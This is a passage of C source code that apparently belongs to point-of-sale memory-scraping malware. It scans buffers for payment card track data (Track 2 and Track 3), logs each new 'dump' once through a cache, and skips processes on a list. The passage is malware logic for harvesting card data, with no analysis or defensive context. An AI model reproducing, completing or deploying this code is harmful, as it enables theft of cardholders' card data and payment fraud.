							if((len = IsEndDataValid(Buf,bWCHAR,bSentinel,(T2MaxLen-TotalLen)))!=-1) { //We have valid track 2

									//Skip track 3 end data
									if(bWCHAR==FALSE) { Buf += len; } else { Buf += 2*len; }
									TotalLen += len;
									sBuf--; //cuz we skipped the + before we assigned this pointer

									_memset(Track3,0x00,sizeof(Track3));
									if(bWCHAR==FALSE) { _memcpy(Track3,sBuf,TotalLen);  } 
									else { WideCharToMultiByte(CP_ACP,0,(WCHAR *)sBuf,TotalLen,Track3,sizeof(Track3),NULL,NULL); }

									//MessageBox(NULL,Track3,NULL,MB_OK);
								  if(StrStr(pCacheMap,Track3)==NULL) { //not logged 

								   //Sleep(1);
									  //MessageBox(NULL,"Add Item",NULL,MB_OK);
		
							       AddItem(Track3,TotalLen); 
								   AddCache(Track3,TotalLen);

								   if(bWCHAR==FALSE) { pBuf += TotalLen; RealBufSize -= TotalLen; } else { pBuf += 2*TotalLen ; RealBufSize -= 2*TotalLen; }
								   bIncreased = TRUE;
							
							      }
							}

						}
					}

				}
			
			} //TRACK 3


		} //if(*Buf<0x7F && *Buf>0x20)
		if(bIncreased==TRUE) { bIncreased=FALSE; goto Check; } //We just found dump, and increased over it, dont skip that char after the dump
		pBuf++;
		RealBufSize--;
		 
	} //while(BufSize>0) 
}

BOOL SkipProcess(char *ProcName) { //TRUE - skip the processes, FALSE - dont skip

	int i;

	i = 0;
	while(SkipProcesses[i]!=0x00) {

		if(lstrcmpi(ProcName,SkipProcesses[i])==0) { return TRUE; }
		i++;
	}

	return FALSE;
}
